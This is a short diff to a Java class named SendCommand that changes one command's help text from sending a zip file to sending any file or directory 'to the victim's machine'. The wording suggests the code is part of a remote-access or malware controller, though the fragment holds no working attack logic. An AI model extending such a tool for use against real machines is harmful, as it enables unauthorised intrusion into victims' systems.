@@ -11,7 +11,7 @@ public class SendCommand extends Command{
 	private String _command;
 	
 	public SendCommand() {
-		super("send", "\"file.zip\"", "sends the specified zip file to the victim's machine and extracts it");
+		super("send", "\"file/directory\"", "sends the specified file/directory to the victim's machine");
 	}
 
 	protected boolean parse(String command) {
